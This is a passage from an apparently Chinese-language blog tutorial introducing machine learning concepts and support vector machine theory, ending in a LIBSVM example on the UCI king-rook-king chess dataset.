    <content type="html"><![CDATA[<p>机器学习入门。</p><a id="more"></a><h1 id="What-is-Machine-Learning"><a href="#What-is-Machine-Learning" class="headerlink" title="What is Machine Learning"></a>What is Machine Learning</h1><p>机器学习致力于研究通过计算的手段，利用经验来改善系统自身的性能。在计算机系统中，<strong>经验</strong>通常以<strong>数据</strong>形式存在，而机器学习所研究的主要内容，是关于在计算机上从数据中产生<strong>模型</strong>（Model）的算法，即<strong>学习算法</strong>（Learning Algorithm）。有了学习算法，把经验数据提供给它，它就能基于这些数据产生模型；在面对新的情况时，模型会给我们提供相应的判断。如果说计算机科学是研究关于<strong>算法</strong>的学问，那么机器学习就是研究关于<strong>学习算法</strong>的学问。</p><h2 id="Data-Set"><a href="#Data-Set" class="headerlink" title="Data Set"></a>Data Set</h2><p>假定我们收集了一批关于西瓜的数据，例如 <code>(色泽=青绿, 根蒂=蜷缩, 敲声=浊响), (色泽=乌黑, 根蒂=稍蜷, 敲声=沉闷), (色泽=浅白, 根蒂=硬挺, 敲声=清脆)……</code>，这组记录的集合被称作一个数据集（Data Set），其中每条记录是关于一个事件或对象的描述，称为一个<strong>示例</strong>（Instance）或<strong>样本</strong>（Sample）。反映事件或对象在某方面的表现或性质的事项，例如<strong>色泽</strong>、<strong>根蒂</strong>、<strong>敲声</strong>，称为<strong>属性</strong>（Attribute）或<strong>特征</strong>（Feature）；属性上的取值，例如<strong>青绿</strong>、<strong>乌黑</strong>，称为<strong>属性值</strong>（Attribute Value）。属性张成的空间称为<strong>属性空间</strong>（Attribute Space）、<strong>样本空间</strong>（Sample Space）或<strong>输入空间</strong>。如果将<strong>色泽</strong>、<strong>根蒂</strong>、<strong>敲声</strong>作为三个坐标轴，则它们张成一个用于描述西瓜的三维空间，每个西瓜都可在这个空间中找到自己的坐标位置。由于空间中的每个点对应一个坐标向量，因此我们也把一个示例称为一个<strong>特征向量</strong>（Feature Vector）。</p><p>一般地，令 $D=\{x_1,x_2,\cdots,x_m\}$ 表示包含 $m$ 个示例的数据集，每个示例由 $d$ 个属性描述，则每个示例 $x_i=(x_{i1};x_{i2};\cdots;x_{id})$ 是 $d$ 维空间 $\chi$ 中的一个向量，$x_i\in\chi$，其中 $x_{ij}$ 是 $x_i$ 在第 $j$ 个属性上的取值，$d$ 称为样本 $x_i$ 的<strong>维数</strong>（Dimensionality）。</p><h2 id="Training"><a href="#Training" class="headerlink" title="Training"></a>Training</h2><p>从数据中学得模型的过程称为<strong>学习</strong>（Learning）或<strong>训练</strong>（Training），这个过程通过执行某个学习算法来完成。训练过程中使用的数据称为<strong>训练数据</strong>（training data），其中每个样本称为一个<strong>训练样本</strong>（Training Sample），训练样本组成的集合称为<strong>训练集</strong>（Training Set）。学得模型对应了关于数的某种潜在的规律，因此亦称<strong>假设</strong>（Hypothesis）；这种潜在规律自身，则称为<strong>真相</strong>或<strong>真实</strong>（Ground-truth），学习过程就是为了找出或逼近真相。</p><p>如果希望学得一个能帮助判断的模型，仅有前面的示例数据是不够的。建立这样的关于<strong>预测</strong>（Prediction）的模型，我们需获得训练样本的<strong>结果</strong>信息，例如 <code>((色泽=青绿, 根蒂=蜷缩, 敲声=浊响), 好瓜)</code>。这里关于示例结果的信息，例如<strong>好瓜</strong>，称为<strong>标记</strong>（Label）；拥有了标记信息的示例，则称为<strong>样例</strong>（Example）。一般地，用 $(x_i, y_i)$ 表示第 $i$ 个样例，其中 $y_i\in\upsilon$ 是示例 $x_i$ 的标记，$\upsilon$ 是所有标记的集合，亦称<strong>标记空间</strong>（Label Space）或<strong>输出空间</strong>。</p><p>若欲预测的是离散值，例如<strong>好瓜</strong>或<strong>坏瓜</strong>，此类学习任务称为<strong>分类</strong>（Classification）；若欲预测的是连续值，例如西瓜成熟度，此类学习任务称为<strong>回归</strong>（Regression）。对只涉及两个类别的<strong>二分类</strong>（Binary Classification）任务，通常称其中一个类为<strong>正类</strong>（Positive Class），另一个类为<strong>反类</strong>（Negative Class）；涉及多个类别时，则称为<strong>多分类</strong>（Multi-class Classification）任务。一般地，预测任务是希望通过对训练集 $\{(x_1,y_1),(x_2,y_2),\cdots,(x_m,y_m)\}$ 进行学习，建立一个从输入空间 $\chi$ 到输出空间 $\upsilon$ 的映射 $f:\chi\mapsto\upsilon$。对二分类任务，通常令 $\upsilon = \{-1,+1\}$ 或 $\{0,1\}$；对多分类任务，$\vert\upsilon\vert&gt;2$；对回归任务，$\upsilon=\mathbb{R}$，$\mathbb{R}$ 为实数集。</p><h2 id="Testing"><a href="#Testing" class="headerlink" title="Testing"></a>Testing</h2><p>学得模型后，使用其进行预测的过程称为<strong>测试</strong>（Testing），被预测的样本称为<strong>测试样本</strong>（Testing Sample）。例如在学得 $f$ 后，对测试例 $x$，可得到其预测标记 $y=f(x)$。还可以做<strong>聚类</strong>（Clustering），即将训练集中的数据分成若干组，每组称为一个<strong>簇</strong>（Cluster）；这些自动形成的簇可能对应一些潜在的概念划分，有助于我们了解数据内在的规律，能为更深入地分析数据建立基础。</p><p>根据训练数据是否拥有标记信息，学习任务可大致划分为两大类<strong>监督学习</strong>（Supervised Learning）和<strong>无监督学习</strong>（Unsupervised Learning），分类和回归是前者的代表，而聚类则是后者的代表。</p><p>机器学习的目标是使学得的模型能很好地适用于<strong>新样本</strong>，而不是仅仅在训练样本上工作得很好；即便对聚类这样的无监督学习任务，也希望学得的簇划分能适用于没在训练集中出现的样本。学得模型适用于新样本的能力，称为<strong>泛化</strong>（Generalization）能力。具有强泛化能力的模型能很好地适用于整个样本空间。尽管训练集通常只是样本需间的一个很小的采样，我们仍希望它能很好地反映出样本空间的特性，否则就很难期望在训练集上学得的模型能在整个样本空间上都工作得很好。通常假设样本空间中全体样本服从一个未知<strong>分布</strong>（Distribution）$D$，我们获得的每个样本都是独立地从这个分布上采样获得的，即<strong>独立同分布</strong>（Independent and Identically Distributed，简称 I.I.D.）。一般而言，训练样本越多，我们得到的关于 $D$ 的信息越多，这样就越有可能通过学习获得具有强泛化能力的模型。</p><h2 id="No-Free-Lunch-Theorem"><a href="#No-Free-Lunch-Theorem" class="headerlink" title="No Free Lunch Theorem"></a>No Free Lunch Theorem</h2><p>如果我们不对特征空间有先验假设，则所有算法的平均表现是一样的。</p><p>假设有两种算法 $Z_a$ 和 $Z_b$，分别对样本进行测试。得到的结果是不确定的，可能 $Z_a$ 的泛化能力更强，当然也有可能 $Z_b$ 的泛化能力更强。</p><p><img src="/pics/Machine-Learning-SVM/1.png" srcset="/img/loading.gif" alt></p><p>假设样本空间 $\chi$ 和假设空间 $\eta$ 都是离散的。令 $P(h|X, Z_a)$ 代表算法 $Z_a$ 基于训练数据 $X$ 产生假设 $h$ 的概率，再令 $f$ 代表我们希望学习的真实目标函数。$Z_A$ 的<strong>训练集外误差</strong>，即 $Z_a$ 在训练集之外的所有样本上的误差为：</p><p>$$<br>E_{ote}(Z_A|X,f)=\sum_h\sum_{x\in\chi-X}P(x) {II}(h(x)\not ={f(x)}) P(h|X,Z_a)<br>$$</p><p>其中 $II(\cdot)$ 是指示函数，若 $\cdot$ 为真则取值 $1$，否则取 $0$。这里考虑二分类问题，且真实目标函数可以是任何函数 $\chi\mapsto\{0,1\}$，函数空间为 $\{0,1\}^{|\chi|}$. 对所有可能的 $f$ 按均匀分布对误差求和，有：</p><p>$$<br>\begin{array}{cc}<br>\sum_fE_{ote}(Z_a|X,f)=\sum_f\sum_h\sum_{x\in\chi-X}P(x) {II}(h(x)\not ={f(x)}) P(h|X,Z_a)\\ =\sum_{x\in\chi-X}P(x)\sum_hP(h|X,Z_a)\sum_fII(h(x)\not ={f(x)})\\ =\sum_{x\in\chi-X}P(x)\sum_hP(h|X,Z_a)\frac{1}{2}2^{|\chi|}\\ =\frac{1}{2}2^{|\chi|}\sum_{x\in\chi-X}P(x)\sum_hP(h|X,Z_a)\\ =\frac{1}{2}2^{|\chi|}\sum_{x\in\chi-X}P(x)\cdot1<br>\end{array}<br>$$</p><p>可以看到，上面得出的总误差和学习算法无关，也就是说，不管算法 $Z_a$ 有多聪明，算法 $Z_b$ 有多笨拙，两者期望是相同的。</p><blockquote><p>不过一般认为特征差距小的样本更有可能是同一类。</p></blockquote><h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h2><p>机器学习主要分为以下几个步骤：</p><ul><li>获取训练集；</li><li>从训练集中提取特征；</li><li>使用学习算法进行训练；</li><li>对样本集进行测试。</li></ul><h1 id="Support-Vector-Machine"><a href="#Support-Vector-Machine" class="headerlink" title="Support Vector Machine"></a>Support Vector Machine</h1><p>支持向量机（Vapnik 发明）是一种最大化间隔（Margin）的分类算法。</p><h2 id="Linear-Model-Linear-Separable"><a href="#Linear-Model-Linear-Separable" class="headerlink" title="Linear Model - Linear Separable"></a>Linear Model - Linear Separable</h2><p>定义：</p><ol><li>训练数据及标记：$\{(x_1,y_1),(x_2,y_2),\cdots,(x_N,y_N)\}$，其中 $x$ 为一个向量，$y$ 为一个标记。例如上面提到的 <code>((色泽=青绿, 根蒂=蜷缩, 敲声=浊响), 好瓜)</code>；</li><li>线性模型：$(\omega, b)$，其中 $\omega$ 为一个向量（和 $x$ 的维度相同），$b$ 是一个常数。有超平面（Hyperplane）对应的方程 $\omega_1x_1+\omega_2x_2+\cdots+\omega_Nx_N+b=0$，一般写成 $\omega^Tx+b=0$，该超平面将输入空间分成了两个部分，其中超平面的法向量 $\omega=\begin{bmatrix}\omega_1\\ \omega_2\\ \vdots\\ \omega_N\end{bmatrix}$。当学得 $\omega$ 和 $b$ 后，模型就可以确定了；</li><li>一个训练集（$\{(x_i, y_i)\}_{i=1\sim N}$）线性可分是指存在 $(\omega, b)$，对任意 $i=1 \sim N$ 有：<ol><li>若 $y_i=+1$，则 $\omega^Tx_i+b≤0$；</li><li>若 $y_i=-1$，则 $\omega^Tx_i+b&gt;0$；</li><li>总结为 $y_i[\omega^Tx_i+b]≥0$。</li></ol></li></ol><p><img src="/pics/Machine-Learning-SVM/2.png" srcset="/img/loading.gif" alt></p><p>其中使等号成立的点被称为<strong>支持向量</strong>（Support Vector），两个异类支持向量到超平面的距离称为<strong>间隔</strong>（Margin）。以下为支持向量机的基本型，即将原本的求最大间隔转换成了一个带有限制条件的最小化问题。同时这里的最小化也是一个优化问题（凸优化问题中的二次规划问题，即目标函数为二次项，而限制条件为一次项，其结果要么无解，要么只有一个极值）：</p><ul><li>最小化（Minimize）：$\frac{1}{2}\lVert\omega\rVert^2$；</li><li>限制条件（Subject to）：$y_i[\omega^Tx_i+b]≥1(i=1\sim N)$。</li></ul><p>证明：</p><ul><li>事实 1：$\omega^Tx+b=0$ 与 $a\omega^Tx+ab=0$ 是同一个平面（$a\in \mathbb{R}^+$），两者满足同一公式；</li><li>事实 2：点到平面的距离公式。<ul><li>有平面 $\omega_1x+\omega_2y+b=0$，则点 $(x_0, y_0)$ 到此平面的距离 $d$ 为 $\frac{|\omega_1x_0+\omega_2y_0+b|}{\sqrt{\omega_1^2+\omega_2^2}}$；</li><li>有超平面 $\omega^Tx+b=0$，则向量 $x_0$ 到此超平面的距离 $d$ 为 $\frac{\omega^Tx_0+b}{\sqrt{\omega_1^2+\omega_2^2+\cdots+\omega_m^2}}$，即 $\frac{\omega^Tx_0+b}{\lVert\omega\rVert}$。</li></ul></li><li>可以用 $a$ 去缩放，使得 $(\omega, b)$ 变为 $(a\omega, ab)$，最终使在支持向量 $x_0$ 上有：$|\omega^Tx_0+b|=1$，此时支持向量与平面的距离为 $d=\frac{1}{\lVert\omega\rVert}$。那么最小化 $\lVert\omega\rVert$ 就可以达到最大化间隔 $d$ 的作用（二次方和参数 $\frac{1}{2}$ 主要用于后面的求导，对求最小化没有影响）。</li></ul><h2 id="Non-linear-Model-Non-linear-Separable"><a href="#Non-linear-Model-Non-linear-Separable" class="headerlink" title="Non-linear Model - Non-linear Separable"></a>Non-linear Model - Non-linear Separable</h2><p>对线性模型进行改造：</p><ul><li>最小化：$\frac{1}{2}\lVert\omega\rVert^2+C\sum_{i=1}^N\xi_i$，$\xi$ 为松弛变量（Slack Variable），$C\sum_{i=1}^N\xi_i$ 为正则项（Regulation Term），$C$ 为事先设定好的参数；</li><li>限制条件；<ul><li>$y_i[\omega^Tx_i+b]≥1-\xi(i=1\sim N)$；</li><li>$\xi≥0$。</li></ul></li><li>高维映射 $\phi(x)$，即 $x\mapsto^\phi\phi(x)$，$x$ 是一个低维的矢量，$\phi(x)$ 是一个高维的矢量。<ul><li>在高维空间下被线性分割的概率更大，故可以将原限制条件中的 $x$ 替换为 $\phi(x)$，同时 $\omega$ 也变为一个和 $\phi(x)$ 相同维度的向量；</li><li>例：有如下高维映射 $x=\begin{bmatrix}a\\ b\end{bmatrix}\mapsto^\phi\phi(x)=\begin{bmatrix}a^2\\ b^2\\ a\\ b\\ ab\end{bmatrix}$</li><li>给出异或问题如下：$x_1=\begin{bmatrix}0\\ 0\end{bmatrix}\in C_1$、$x_2=\begin{bmatrix}1\\ 1\end{bmatrix}\in C_1$、$x_3=\begin{bmatrix}1\\ 0\end{bmatrix}\in C_2$、$x_4=\begin{bmatrix}0\\ 1\end{bmatrix}\in C_2$；</li><li>经过上面的高维映射后，得到 $\phi(x_1)=\begin{bmatrix}0\\ 0\\ 0\\ 0\\ 0\end{bmatrix}$、$\phi(x_2)=\begin{bmatrix}1\\ 1\\ 1\\ 1\\ 1\end{bmatrix}$、$\phi(x_3)=\begin{bmatrix}1\\ 0\\ 1\\ 0\\ 0\end{bmatrix}$、$\phi(x_4)=\begin{bmatrix}0\\ 1\\ 0\\ 1\\ 0\end{bmatrix}$；</li><li>可求出一组 $\omega=\begin{bmatrix}-1\\ -1\\ -1\\ -1\\ 6\end{bmatrix}, b=1$，使得 $\begin{cases}\omega^T\phi(x_1)+b=1\in C_1\\ \omega^T\phi(x_2)+b=3\in C_1\\ \omega^T\phi(x_3)+b=-1\in C_2\\ \omega^T\phi(x_4)+b=-1\in C_2\end{cases}$。</li></ul></li></ul><p><img src="/pics/Machine-Learning-SVM/3.png" srcset="/img/loading.gif" alt></p><p><strong>SVM 中将 $\phi(x)$ 选择为无限维映射</strong>。而我们可以不知道无限维映射 $\phi(x)$ 的<em>显示</em>表达式，只需要知道一个核函数（Kernel Function）（$\phi(x_i)$ 和 $\phi(x_j)$ 两个无限维向量的内积）：</p><p>$$<br>K(x_i,x_j)=\phi(x_i)^T\phi(x_j)<br>$$</p><p>则无限维优化式仍然可解。</p><h3 id="核函数"><a href="#核函数" class="headerlink" title="核函数"></a>核函数</h3><table><thead><tr><th style="text-align:center">名称</th><th style="text-align:center">表达式</th><th style="text-align:center">参数</th></tr></thead><tbody><tr><td style="text-align:center">线性核（Linear）</td><td style="text-align:center">$K(x_i,x_j)=x_i^Tx_j$</td><td style="text-align:center">-</td></tr><tr><td style="text-align:center">多项式核（Poly）</td><td style="text-align:center">$K(x_i,x_j)=(x_i^Tx_j)^d$</td><td style="text-align:center">$d≥1$ 为多项式的次数</td></tr><tr><td style="text-align:center">高斯径向基函数（RBF）</td><td style="text-align:center">$K(x_i,x_j)=e^{-\frac{\lVert x_i-x_j\rVert^2}{2\tau^2}}$</td><td style="text-align:center">$\tau&gt;0$ 为高斯核的带宽（Width）</td></tr><tr><td style="text-align:center">拉普拉斯核</td><td style="text-align:center">$K(x_i,x_j)=e^{-\frac{\lVert x_i-x_j\rVert}{\tau}}$</td><td style="text-align:center">$\tau&gt;0$</td></tr><tr><td style="text-align:center">Sigmoid 核</td><td style="text-align:center">$K(x_i,x_j)=\tanh(\beta x_i^Tx_j+\theta)$</td><td style="text-align:center">$\tanh$ 为双曲正切函数，$\beta&gt;0$，$\theta&lt;0$</td></tr></tbody></table><p>通过函数组合也可以得到核函数：</p><ul><li>若 $K_1$ 和 $K_2$ 是核函数，则对于任意正数 $\gamma_1$、$\gamma_2$，其线性组合 $\gamma_1K_1+\gamma_2K_2$ 也是核函数；</li><li>若 $K_1$ 和 $K_2$ 是核函数，则核函数的直积（笛卡尔积）$K_1\times K_2(x_i,x_j)=K_1(x_i,x_j)K_2(x_i,x_j)$ 也是核函数；</li><li>若 $K_1$ 是核函数，则对于任意函数 $g(x)$，$K(x_i,x_j)=g(x_i)K_1(x_i,x_j)g(x_j)$ 也是核函数。</li></ul><p>$K(x_i,x_j)$ 能够写成 $\phi(x_i)^T\phi(x_j)$ 的充要条件（Mercer’s Theorem）：</p><ol><li>交换性：$K(x_i,x_j)=K(x_j,x_i)$；</li><li>半正定性：对任意常数 $c_i$ 和向量 $x_i$（$i=1\sim N$），有 $\sum_{i=1}^N\sum_{j=1}^Nc_ic_jK(x_i,x_j)≥0$。</li></ol><h3 id="优化理论"><a href="#优化理论" class="headerlink" title="优化理论"></a>优化理论</h3><p>需要在只知道 $K$，不知道 $\phi$ 的情况下解出优化问题（Kernel Trick）。</p><h4 id="原问题（Prime-Problem）"><a href="#原问题（Prime-Problem）" class="headerlink" title="原问题（Prime Problem）"></a>原问题（Prime Problem）</h4><ul><li>最小化：$f(\omega)$；</li><li>限制条件：$g_i(\omega)≤0(i=1\sim K)$、$h_i(\omega)=0(i=1\sim M)$。</li></ul><h4 id="对偶问题（Dual-Problem）"><a href="#对偶问题（Dual-Problem）" class="headerlink" title="对偶问题（Dual Problem）"></a>对偶问题（Dual Problem）</h4><ul><li>定义函数：$\begin{array}{cc}L(\omega,\alpha,\beta)=f(\omega)+\sum_{i=1}^K\alpha_ig_i(\omega)+\sum_{i=1}^M\beta_ih_i(\omega)\\ =f(\omega)+\alpha^Tg(\omega)+\beta^Th(\omega)\end{array}$；</li><li>对偶问题定义。<ul><li>最大化：$\theta(\alpha,\beta)=\inf_{所有\omega}\{L(\omega,\alpha,\beta)\}$，其中 $\inf$ 是在确定 $\alpha$ 和 $\beta$ 的情况下遍历 $\omega$ 来计算最小值；</li><li>限制条件：$\alpha_i≥0(i=1\sim K)$。</li></ul></li></ul><h4 id="原问题和对偶问题之间的关系"><a href="#原问题和对偶问题之间的关系" class="headerlink" title="原问题和对偶问题之间的关系"></a>原问题和对偶问题之间的关系</h4><p>定理：如果 $\omega^*$ 是原问题的解，而 $\alpha^*$、$\beta^*$ 是对偶问题的解，则有：</p><p>$$<br>f(\omega^*)≥\theta(\alpha^*,\beta^*)<br>$$</p><p>证：</p><p>$$<br>\begin{array}{cc}<br>\theta(\alpha^*,\beta^*)=\inf\{L(\omega,\alpha^*,\beta^*)\}\\ ≤L(\omega^*,\alpha^*,\beta^*)\\ =f(\omega^*)+\sum_{i=1}^K\alpha_i^*g_i(\omega^*)+\sum_{i=1}^M\beta_i^*h_i(\omega^*)\\ ≤f(\omega^*)<br>\end{array}<br>$$</p><ul><li>定义：$G=f(\omega^*)-\theta(\alpha^*,\beta^*)≥0$，其中 $G$ 叫做原问题与对偶问题的间距（Duality Gap）；</li><li>对于某些特定的优化问题，可以证明 $G=0$；</li><li>强对偶定理：若 $f(\omega)$ 是凸函数，且 $g(\omega)=A\omega+b$，$h(\omega)=C\omega+d$，则此优化问题的原问题与对偶问题的间距为 0，即当 $\omega^*$ 是原问题的解，而 $\alpha^*$、$\beta^*$ 是对偶问题的解时，满足 $f(\omega^*)=\theta(\alpha^*,\beta^*)$；<ul><li>KKT 条件（Karush–Kuhn–Tucker Condition）：在强对偶定理的条件下，对于任意的 $i=1\sim K$，可以得到 $\alpha_i^*=0$ 或 $g_i^*(\omega^*)=0$。</li></ul></li></ul><h3 id="证明非线性模型"><a href="#证明非线性模型" class="headerlink" title="证明非线性模型"></a>证明非线性模型</h3><p>为了和原问题一一对应，将 SVM 做以下调整：</p><ul><li>最小化：$f(\omega)=\frac{1}{2}\lVert\omega\rVert^2-C\sum_{i=1}^N\xi_i$（凸函数）；<ul><li>凸函数定义：对任意 $\omega_1$、$\omega_2$、$\lambda\in[0,1]$，满足 $f(\lambda\omega_1+(1-\lambda)\omega_2)≤\lambda f(\omega_1)+(1-\lambda)f(\omega_2)$。</li></ul></li><li>限制条件；<ul><li>$1+\xi_i-y_i\omega^T\phi(x_i)+y_ib≤0$；</li><li>$\xi_i≤0$（$i=1\sim K$）。</li></ul></li></ul><p>接下来写出对应的对偶问题：</p><ul><li>最大化：$\begin{array}{cc}\theta(\alpha,\beta)=\\ \inf_{所有(\omega,\xi_i,b)}\{\frac{1}{2}\lVert\omega\rVert^2-C\sum_{i=1}^N\xi_i+\sum_{i=1}^N\beta_i\xi_i+\sum_{i=1}^N\alpha_i[1+\xi_i-y_i\omega^T\phi(x_i)-y_ib]\}\end{array}$；</li><li>限制条件（$i=1\sim N$）。<ul><li>$\alpha_i≥0$；</li><li>$\beta_i≥0$。</li></ul></li></ul><p>接下来将对偶问题中的最大化进行化简。首先计算 $\inf$ 对应的最小值，需要求三个自变量对应的偏导数：</p><p>$$<br>\begin{cases}<br>\frac{\partial L}{\partial\omega}=0\\<br>\frac{\partial L}{\partial\xi_i}=0\\<br>\frac{\partial L}{\partial b}=0<br>\end{cases}<br>$$</p><ul><li>其中对向量 $\omega=\begin{bmatrix}\omega_1\\ \omega_2\\ \vdots\\ \omega_m\end{bmatrix}$ 求 $f(\omega)$ 的偏导相当于对每一个分量求偏导，即 $\frac{\partial f}{\partial\omega}=\begin{bmatrix}\frac{\partial f}{\partial\omega_1}\\ \frac{\partial f}{\partial\omega_2}\\ \vdots\\ \frac{\partial f}{\partial\omega_m}\end{bmatrix}$；</li><li>若 $f(\omega)=\frac{1}{2}\lVert\omega\rVert^2$，则 $\frac{\partial f}{\partial\omega}=\omega$；</li><li>若 $f(\omega)=\omega^Tx$，则 $\frac{\partial f}{\partial\omega}=x$。</li></ul><p>求三个自变量的偏导数的结果如下：</p><p>$$<br>\begin{cases}<br>\frac{\partial L}{\partial\omega}=0 \mapsto \omega-\sum_{i=1}^N\alpha_iy_i\phi(x_i)=0\\<br>\frac{\partial L}{\partial\xi_i}=0 \mapsto -C+\beta_i+\alpha_i=0\\<br>\frac{\partial L}{\partial b}=0 \mapsto -\sum_{i=1}^N\alpha_iy_i=0<br>\end{cases}<br>$$</p><p>接着将求出的条件代入 $\theta(\alpha,\beta)$，将 $\frac{1}{2}\lVert\omega\rVert^2$ 化简，可以消去 $\phi(\cdot)$：</p><p>$$<br>\begin{array}{cc}<br>\frac{1}{2}\lVert\omega\rVert^2=\frac{1}{2}\omega^T\omega\\<br>=\frac{1}{2}(\sum_{i=1}^N\alpha_iy_i\phi(x_i))^T(\sum_{j=1}^N\alpha_jy_j\phi(x_j))\\<br>=\frac{1}{2}\sum_{i=1}^N\sum_{j=1}^N\alpha_i\alpha_jy_iy_j\phi(x_i)^T\phi(x_j)\\<br>=\frac{1}{2}\sum_{i=1}^N\sum_{j=1}^N\alpha_i\alpha_jy_iy_jK(x_i,x_j)<br>\end{array}<br>$$</p><p>同理可以把 $-\sum_{i=1}^N\alpha_iy_i\omega^T\phi(x_i)$ 化简，并消去 $\phi(\cdot)$：</p><p>$$<br>\begin{array}{cc}<br>-\sum_{i=1}^N\alpha_iy_i\omega^T\phi(x_i)=-\sum_{i=1}^N\alpha_iy_i(\sum_{j=1}^N\alpha_jy_j\phi(x_j))^T\phi(x_i)\\<br>=-\sum_{i=1}^N\sum_{j=1}^N\alpha_i\alpha_jy_iy_j\phi(x_j)^T\phi(x_i)\\<br>=-\sum_{i=1}^N\sum_{j=1}^N\alpha_i\alpha_jy_iy_jK(x_i,x_j)<br>\end{array}<br>$$</p><p>最后得到对偶问题的最终式：</p><ul><li>最大化：$\begin{array}{cc}\theta(\alpha)=\frac{1}{2}\lVert\omega\rVert^2+\sum_{i=1}^N\alpha_i[1-y_i\omega^T\phi(x_i)]\\ =\sum_{i=1}^N\alpha_i-\frac{1}{2}\sum_{i=1}\sum_{j=1}\alpha_i\alpha_jy_iy_jK(x_i,x_j)\end{array}$；<ul><li>SMO 算法可以解凸优化问题。</li></ul></li><li>限制条件。<ul><li>$0≤\alpha_i≤C$；</li><li>$\sum_{i=1}^N\alpha_iy_i=0$。</li></ul></li></ul><p>这里最终得到的是一个有关 $\alpha$ 的优化问题。由于测试时需要计算 $\omega^T\phi(x_i)+b$ 的值，所以这里仍然需要找到 $\omega^T\phi(x_i)+b$ 和 $\alpha$ 之间的关系。首先 $\omega$ 不需要计算，可以通过和前面类似的方法，使用核函数计算出 $\omega^T\phi(x_i)$ 的值：</p><p>$$<br>\begin{array}{cc}<br>\omega^Tx_i=(\sum_{j=1}^N\alpha_jy_j\phi(x_j))^T\phi(x_i)\\<br>=\sum_{j=1}^N\alpha_jy_j\phi(x_j)^T\phi(x_i)\\<br>=\sum_{j=1}^N\alpha_jy_jK(x_i,x_j)<br>\end{array}<br>$$</p><p>接下来是 $b$。因为这里的情况满足 KKT 条件，那么存在 $\alpha_i^*=0$ 或是 $g_i^*(\omega^*)=0$，对应满足的式子如下：</p><ul><li>要么 $\beta_i=0$；要么 $\xi_i=0$；</li><li>要么 $\alpha_i=0$；要么 $1+\xi_i-y_i\omega^T\phi(x_i)-y_ib=0$。</li></ul><p>首先取一个 $0&lt;\alpha_i&lt;C$，那么 $1+\xi_i-y_i\omega^T\phi(x_i)-y_ib=0$，同时可得出 $\beta_i=C-\alpha_i&gt;0$，即 $\beta_i≠0$ 且 $\xi_i=0$。经化简后，$b$ 的值为：</p><p>$$<br>\begin{array}{cc}<br>1-y_i\omega^T\phi(x_i)-y_ib=0\\<br>b=\frac{1-y_i\omega^T\phi(x_i)}{y_i}\\<br>b=\frac{1-y_i(\sum_{j=1}^N\alpha_jy_j\phi(x_j))^T\phi(x_i)}{y_i}\\<br>b=\frac{1-y_i\sum_{j=1}^N\alpha_jy_jK(x_i,x_j)}{y_i}<br>\end{array}<br>$$</p><h2 id="Summary-1"><a href="#Summary-1" class="headerlink" title="Summary"></a>Summary</h2><ol><li>训练流程；<ul><li>输入训练样本 $\{(x_i,y_i)\}_{i=1\sim N}$；</li><li>解优化问题。<ul><li>最大化：$\theta(\alpha)=\sum_{i=1}^N\alpha_i-\frac{1}{2}\sum_{i=1}\sum_{j=1}\alpha_i\alpha_jy_iy_jK(x_i,x_j)$；</li><li>限制条件。<ul><li>$0≤\alpha_i≤C$；</li><li>$\sum_{i=1}^N\alpha_iy_i=0$。</li></ul></li></ul></li><li>算 $b$，找一个 $0&lt;\alpha_i&lt;C$，得出 $b=\frac{1-y_i\sum_{j=1}^N\alpha_jy_jK(x_i,x_j)}{y_i}$。</li></ul></li><li>测试流程。<ul><li>输入测试样本 $X$。<ul><li>若 $\sum_{i=1}^N\alpha_iy_iK(x_i,x)+b≥0$，则 $y=+1$；</li><li>若 $\sum_{i=1}^N\alpha_iy_iK(x_i,x)+b&lt;0$，则 $y=-1$。</li></ul></li></ul></li></ol><h2 id="Programming"><a href="#Programming" class="headerlink" title="Programming"></a>Programming</h2><ul><li>兵王问题：黑方只剩一个王，白方剩一个兵一个王；</li><li>两种可能；<ul><li>白方将死黑方，获胜；</li><li>和棋。</li></ul></li><li>这两种可能视三个棋子在棋盘的位置而确定。</li></ul><p>有数据 <a href="https://archive.ics.uci.edu/ml/machine-learning-databases/chess/king-rook-vs-king/krkopt.data" target="_blank" rel="noopener">krkopt.data</a> 用于训练和测试。每行为一组数据集和标记，前 6 位是 3 个坐标，最后一个单词表示平局（draw）或是白棋在 x 步之后将死黑棋：</p><pre><code class="bash">$ wc krkopt.data   28056   28056  531806 krkopt.data$ cat ./krkopt.dataa,1,b,3,c,2,drawa,1,c,1,c,2,drawa,1,c,1,d,1,drawa,1,c,1,d,2,drawa,1,c,2,c,1,drawa,1,c,2,c,3,drawa,1,c,2,d,1,drawa,1,c,2,d,2,drawa,1,c,2,d,3,drawa,1,c,3,c,2,draw...c,3,e,6,e,1,ninec,3,e,6,f,1,ninec,3,e,6,g,1,ninec,3,e,6,h,2,ninec,3,e,6,h,7,ninec,3,e,7,e,1,ninec,3,e,7,f,1,ninec,3,e,7,g,1,ninec,3,e,7,h,2,ninec,3,e,8,e,1,ninec,3,e,8,f,1,nine...b,1,g,3,e,4,sixteenb,1,g,3,e,5,sixteenb,1,g,3,f,5,sixteenb,1,g,3,g,5,sixteenb,1,g,6,e,4,sixteenb,1,g,6,e,5,sixteenb,1,g,6,e,6,sixteenb,1,g,6,f,4,sixteenb,1,g,6,g,4,sixteenb,1,g,7,e,5,sixteenb,1,g,7,e,6,sixteen</code></pre><ul><li>总样本数 28056，其中正样本 2796，负样本 25260；</li><li>随机取 5000 个样本进行训练，其余用于测试；</li><li>样本归一化，在训练样本上，求出每个维度的均值和方差，在训练和测试样本上同时归一化：$newX=\frac{X-mean(X)}{std(X)}$，其中 $mean(X)$ 是 $X$ 的均值，$std(X)$ 是 $X$ 方差的二次根；</li><li>高斯核；</li><li>5-Fold Cross Validation，在 $CScale=[2^{-5}, 2^{15}]$、$\gamma Scale=[2^{-15},2^3]$ 中遍历求识别率的最大值。</li></ul><h3 id="LIBSVM"><a href="#LIBSVM" class="headerlink" title="LIBSVM"></a>LIBSVM</h3><p>LIBSVM 是台湾林智仁教授在 2001 年开发的一套支持向量机的库，可以很方便的对数据做分类或回归。由于 LIBSVM 程序小，运用灵活，输入参数少，并且是开源的，易于扩展，其成为目前国内应用最多的 SVM 的库。这里使用 Python 下的 libsvm 库进行测试：</p><pre><code class="bash">$ python3 -m pip install --user libsvm -U</code></pre><p>训练参数设置：<code>svmtrain(yTraining, xTraining, cmd)</code>，<code>cmd</code> 的参数设置如下：</p><ul><li><code>-s svm_type: set type of SVM (default 0)</code><ul><li><code>0 -- C-SVC (multi-class classification)</code></li><li><code>1 -- nu-SVC (multi-class classification)</code></li><li><code>2 -- one-class SVM</code></li><li><code>3 -- epsilon-SVR (regression)</code></li><li><code>4 -- nu-SVR (regression)</code></li></ul></li><li><code>-t kernel_type: set type of 